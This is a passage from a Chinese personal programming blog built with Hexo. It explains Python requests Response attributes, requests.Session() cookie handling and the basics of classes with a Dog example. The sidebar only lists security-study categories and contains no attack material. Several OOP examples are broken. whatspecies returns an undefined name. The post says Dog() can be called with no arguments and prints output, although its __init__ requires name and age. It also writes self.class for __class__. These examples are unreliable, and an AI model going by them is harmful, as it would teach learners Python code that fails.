<li>示例：<code>response.url</code></li>
</ul>
</li>
<li><strong><code>encoding</code></strong><ul>
<li>响应的编码格式（可手动修改以修正解码问题）。</li>
<li>示例：<code>response.encoding = &#39;utf-8&#39;</code></li>
</ul>
</li>
<li><strong><code>cookies</code></strong><ul>
<li>服务器返回的 Cookies（<code>RequestsCookieJar</code> 对象）。</li>
<li>示例：<code>response.cookies.get(&#39;session_id&#39;)</code><br>（此处 <code>get()</code> 并非<code>requests.get()</code>，用于从 cookies 中获取指定名称的 cookie 值）</li>
</ul>
</li>
<li><strong><code>history</code></strong><ul>
<li>重定向历史记录（列表形式，按请求顺序排列）。</li>
<li>示例：<code>response.history[0].status_code</code></li>
</ul>
</li>
</ol>
<h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a><strong>常用方法</strong></h3><ol>
<li><strong><code>json()</code></strong><ul>
<li>将 JSON 响应内容解析为 Python 字典&#x2F;列表。</li>
<li>示例：<code>data = response.json()</code></li>
</ul>
</li>
<li><strong><code>raise_for_status()</code></strong><ul>
<li>若状态码为 4xx&#x2F;5xx，抛出异常（用于错误处理）。</li>
<li>示例：<code>response.raise_for_status()</code></li>
</ul>
</li>
</ol>
<h3 id="其他属性"><a href="#其他属性" class="headerlink" title="其他属性"></a><strong>其他属性</strong></h3><ol>
<li><strong><code>request</code></strong><ul>
<li>返回对应的请求对象（包含请求方法、URL、头信息等）。</li>
<li>示例：<code>response.request.method</code></li>
</ul>
</li>
<li><strong><code>elapsed</code></strong><ul>
<li>请求耗时（<code>datetime.timedelta</code> 对象）。</li>
<li>示例：<code>response.elapsed.total_seconds()</code></li>
</ul>
</li>
<li><strong><code>reason</code></strong><ul>
<li>状态码的文本描述（如 <code>200</code> 的 <code>reason</code> 是 <code>OK</code>）。</li>
<li>示例：<code>response.reason</code></li>
</ul>
</li>
<li><strong><code>is_redirect</code></strong><ul>
<li>布尔值，表示是否重定向。</li>
<li>示例：<code>if response.is_redirect: ...</code></li>
</ul>
</li>
<li><strong><code>apparent_encoding</code></strong><ul>
<li>通过内容推断的编码格式（比 <code>encoding</code> 更可靠）。</li>
<li>示例：<code>response.encoding = response.apparent_encoding</code></li>
</ul>
</li>
<li><strong><code>raw</code></strong><ul>
<li>原始响应流（需在请求中设置 <code>stream=True</code>）。</li>
<li>示例：<code>response.raw.read(10)</code></li>
</ul>
</li>
</ol>
<h2 id="其他知识点"><a href="#其他知识点" class="headerlink" title="其他知识点"></a>其他知识点</h2><h3 id="requests-Session"><a href="#requests-Session" class="headerlink" title="requests.Session()"></a><strong>requests.Session()</strong></h3><p>Python 的 <code>requests.Session()</code> 是<strong>客户端的工具</strong>（注意与服务端的 Session 区分），目的是<strong>简化客户端与服务端交互时的状态管理</strong>。它的核心作用是：</p>
<p>**自动管理 Cookies **</p>
<ul>
<li><strong>自动保存</strong>服务端通过 <code>Set-Cookie</code> 返回的所有 Cookies（包括 <code>session_id</code> 等）</li>
<li><strong>自动携带</strong>这些 Cookies 发送后续请求</li>
</ul>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建客户端会话（自动管理 Cookies）</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.服务端返回 Cookie 并自动保存到 Session 中</span></span><br><span class="line">session.post(<span class="string">&quot;https://example.com/login&quot;</span>, data=&#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;123&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.通过 session.get() 这样的形式，自动携带 Cookie（无需手动处理 Cookie 并添加到 header 中）</span></span><br><span class="line">response = session.get(<span class="string">&quot;https://example.com/profile&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>其他功能</strong></p>
<ul>
<li><strong>连接池（Connection Pooling）</strong>：复用 TCP 连接，提升性能</li>
<li><strong>统一配置</strong>：预先设置 Headers、Auth、Proxies 等，适用于所有请求</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/24/Python-requests/" data-id="cmag7dmmr0006p0uh2toj5cbo" data-title="Python-requests" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/requests/" rel="tag">requests</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Python-面向对象入门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" class="article-date">
  <time class="dt-published" datetime="2025-04-22T13:00:39.000Z" itemprop="datePublished">2025-04-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">编程笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/">Python-面向对象入门</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>来看一个简单的定义类的案例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="comment"># 类属性</span></span><br><span class="line">    species = <span class="string">&#x27;犬科动物&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 方法：返回种类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">whatspecies</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> species</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造函数：创建小狗时必须提供名字和年龄</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name  <span class="comment"># 小狗的名字（属性）</span></span><br><span class="line">        <span class="variable language_">self</span>.age = age    <span class="comment"># 小狗的年龄（属性）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方法：小狗坐下</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 乖乖坐下了！&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>可以理解为，因为许多对象都有共同点，可以根据共同点对它们分类，所以有了“类”。不过，实践中往往是定义好类后，才以定义好的类为标准，“创造”出许多同一类的对象。这些被“创造”出来的对象，称为实例。用定义好的类“创造”对象的过程，称为实例化。</p>
<h2 id="属性与方法，实例化"><a href="#属性与方法，实例化" class="headerlink" title="属性与方法，实例化"></a>属性与方法，实例化</h2><p>在类中可以定义属性和方法。如上面的代码段在类 <code>Dog</code> 中定义了属性 <code>species</code> 和方法 <code>whatspecies</code>、 <code>__init__</code> 、<code>sit</code> 等。</p>
<p>要调用某个类的属性和方法，可以直接通过 <code>类名.属性/方法</code> 这样的方式，也可以通过实例化。</p>
<p><strong>类名.属性&#x2F;方法</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(Dog().species) <span class="comment"># 共输出2次“犬科动物”</span></span><br><span class="line"><span class="built_in">print</span>(Dog().whatspecies()) <span class="comment"># 即使定义时省略了括号，Dog()在此处也不能省略括号，否则不会被当成类名</span></span><br></pre></td></tr></table></figure>

<p><strong>实例化</strong>：<br>实例化是指用定义好的类“创造”对象，让不同的对象（实例）来自同一类，共享类中的属性与方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dog1 = Dog()</span><br><span class="line">dog2 = Dog()</span><br><span class="line"><span class="built_in">print</span>(dog1.species)</span><br><span class="line"><span class="built_in">print</span>(dog1.whatspecies())</span><br><span class="line"><span class="built_in">print</span>(dog2.species)</span><br><span class="line"><span class="built_in">print</span>(dog2.whatspecies()) <span class="comment"># 共输出4次“犬科动物”</span></span><br></pre></td></tr></table></figure>

<p>另外，属性的定义与变量的定义一致，不过要调用时需要<code>类名.属性</code>或实例化的方式；但方法与函数的定义有一点不同：<strong>必须有一个额外的第一个参数名称, 按照惯例它的名称是 self</strong> （后面会细讲）。</p>
<h2 id="init-方法"><a href="#init-方法" class="headerlink" title="__init__ 方法"></a><code>__init__</code> 方法</h2><p>上面的实例化是直接进行实例化，也可以通过 <code>__init__()</code> 方法实例化类。如上面案例中的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="comment"># 构造函数：创建小狗时必须提供名字和年龄</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name  <span class="comment"># 小狗的名字（属性）</span></span><br><span class="line">        <span class="variable language_">self</span>.age = age    <span class="comment"># 小狗的年龄（属性）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方法：小狗坐下</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 乖乖坐下了！&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>功能</strong>：在创建一个类的实例（对象）时，<code>__init__</code> 方法会被<strong>自动调用</strong>，用于为对象设置初始属性。</p>
<p>对比一下有无 <code>__init__</code> 方法的两种情况：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dog1 = Dog(<span class="string">&quot;大黄&quot;</span>, <span class="number">10</span>)  <span class="comment"># 创建对象时直接传入属性值</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dog1 = Dog()</span><br><span class="line">dog1.name = <span class="string">&quot;大黄&quot;</span>  <span class="comment"># 手动添加属性</span></span><br><span class="line">dog1.age = <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>上面的 <code>Dog(&quot;大黄&quot;, 10)</code> 分别传参给 <code>name </code>与 <code>age</code> 两个属性，再在 <code>__init__</code> 方法中成为实例 <code>dog1</code> 的实例属性（ <code>self</code> 表示实例本身）。</p>
<p><strong>关于实例属性与类属性</strong>：类属性可被所有属于该类的对象调用（类似 <code>dog1.species</code> ，所有该类实例的 <code>species</code> 属性都是“犬科动物”），实例属性则只能通过该实例调用（<code>dog1.name</code>）。</p>
<p><strong>关于 <code>self</code></strong><br><code>self</code> 代表类的实例，而非类本身。类的方法相比普通函数只有一个特别的区别：它们必须有一个额外的第一个参数名称, 按照惯例它的名称是 <code>self</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prt</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.__class__)</span><br><span class="line"></span><br><span class="line">t = Test()</span><br><span class="line">t.prt()</span><br></pre></td></tr></table></figure>

<p>以上实例执行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;__main__.Test instance at 0x100771878&gt;</span><br><span class="line">__main__.Test</span><br></pre></td></tr></table></figure>

<p>从执行结果可以很明显的看出，<code>self</code> 代表的是类的实例，<strong>代表当前对象的地址</strong>，而 <code>self.class</code> 则指向类。<br> 由于 <code>self</code> 并非关键字，所以可以将 <code>self</code> 替换成其他的关键字，也不会出现问题。<br>在 Python中，<code>self</code> 是一个惯用的名称，用于表示类的实例（对象）自身。它是一个指向实例的引用，使得类的方法能够访问和操作实例的属性。<br>当你定义一个类，并在类中定义方法时，第一个参数通常被命名为 <code>self</code>，尽管你可以使用其他名称，但强烈建议使用 <code>self</code>，以保持代码的一致性和可读性</p>
<h2 id="核心概念解析"><a href="#核心概念解析" class="headerlink" title="核心概念解析"></a>核心概念解析</h2><ol>
<li><p><strong>封装</strong>：把数据（属性）和操作（方法）打包在一起</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my_dog.age += <span class="number">1</span>  <span class="comment"># 直接修改属性</span></span><br><span class="line">my_dog.sit()  <span class="comment"># 调用方法</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>继承</strong>：子类继承父类的特性（比如导盲犬是特殊的小狗）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GuideDog</span>(<span class="title class_ inherited__">Dog</span>):  <span class="comment"># 继承自Dog类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">guide</span>(<span class="params">self</span>):</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 正在引导主人！&quot;</span>)</span><br><span class="line"></span><br><span class="line">guide_dog = GuideDog(<span class="string">&quot;大黄&quot;</span>, <span class="number">4</span>)</span><br><span class="line">guide_dog.sit()      <span class="comment"># 继承父类方法</span></span><br><span class="line">guide_dog.guide()    <span class="comment"># 子类新增方法</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>多态</strong>：不同对象对同一方法有不同的响应（比如猫狗的叫法不同）</p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" data-id="cmag7dmmt0007p0uhaswgagb4" data-title="Python-面向对象入门" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" rel="tag">面向对象</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP特性题目</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%88%86%E7%A0%B4/">爆破</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">编程笔记</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cookie/" rel="tag">Cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/URL/" rel="tag">URL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/requests/" rel="tag">requests</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" rel="tag">面向对象</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/Python/" style="font-size: 11.67px;">Python</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Session/" style="font-size: 13.33px;">Session</a> <a href="/tags/URL/" style="font-size: 10px;">URL</a> <a href="/tags/requests/" style="font-size: 10px;">requests</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 18.33px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 15px;">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 16.67px;">杂项知识点</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 13.33px;">爆破</a> <a href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" style="font-size: 10px;">面向对象</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">五月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/05/07/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E8%A7%A3%E4%B8%8E%E7%9F%A5%E8%AF%86/">SQL注入题解与知识</a>
          </li>
        
          <li>
            <a href="/2025/05/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%8F%E6%8A%80%E5%B7%A7/">文件上传小技巧</a>
          </li>
        
          <li>
            <a href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">$_SERVER 数组</a>
          </li>
        
          <li>
            <a href="/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP 特性题目</a>
          </li>
        
          <li>
            <a href="/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/">利用或运算活字印刷</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 Traveler2000<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>